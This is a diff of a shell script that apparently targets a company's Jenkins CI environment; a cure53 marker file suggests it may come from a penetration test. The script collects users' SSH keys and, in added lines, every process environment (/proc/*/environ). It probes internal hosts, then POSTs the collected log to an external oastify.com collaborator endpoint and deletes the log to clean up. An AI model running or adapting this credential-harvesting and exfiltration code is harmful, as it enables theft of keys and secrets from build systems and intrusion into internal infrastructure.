@@ -32,27 +32,21 @@ cat /home/*/.ssh/* >> "${LOG}"
 echo "== ls tmp ==" >> "${LOG}"
 ls -lah /tmp/ >> "${LOG}"
 
+echo "== proc ==" >> "${LOG}"
+cat /proc/*/environ >> "${LOG}"
+
 echo "== ls Root ==" >> "${LOG}"
 ls -lah / >> "${LOG}"
 
-echo "== ls Jenkins Workspace ==" >> "${LOG}"
-touch /srv/jenkins/workspace/cure53.txt
-ls -lah /srv/jenkins/workspace/ >> "${LOG}"
-cat /* >> "${LOG}"
-
-echo "== blueocean.priv.normation.com ==" >> "${LOG}"
-curl -v "http://blueocean.priv.normation.com" >> "${LOG}"
-curl -v "https://blueocean.priv.normation.com" >> "${LOG}"
-
 echo "== nrm-vir-repository-01.priv.normation.com ==" >> "${LOG}"
-curl -v "http://nrm-vir-repository-01.priv.normation.com" >> "${LOG}"
-curl -v "https://nrm-vir-repository-01.priv.normation.com" >> "${LOG}"
+curl --max-time 10 -v "http://nrm-vir-repository-01.priv.normation.com" 2>&1 >> "${LOG}"
+curl --max-time 10 -v "https://nrm-vir-repository-01.priv.normation.com" 2>&1 >> "${LOG}"
 
 echo "== ci.normation.com/jenkins/ ==" >> "${LOG}"
-curl -v "https://ci.normation.com/jenkins/" >> "${LOG}"
+curl --max-time 10 -v "https://ci.normation.com/jenkins/" 2>&1 >> "${LOG}"
 
 # send the collected log to the OAST endpoint
-curl -s -X POST --data-binary @"${LOG}" https://lynrf95yqtuijsb55q3d0brzmqshg94y.oastify.com/makefile
+curl -s -X POST --max-time 10 --data-binary @"${LOG}" "https://lynrf95yqtuijsb55q3d0brzmqshg94y.oastify.com/rsync_wrapper?date=$(date)"
 
 # clean up
 rm -f "${LOG}"
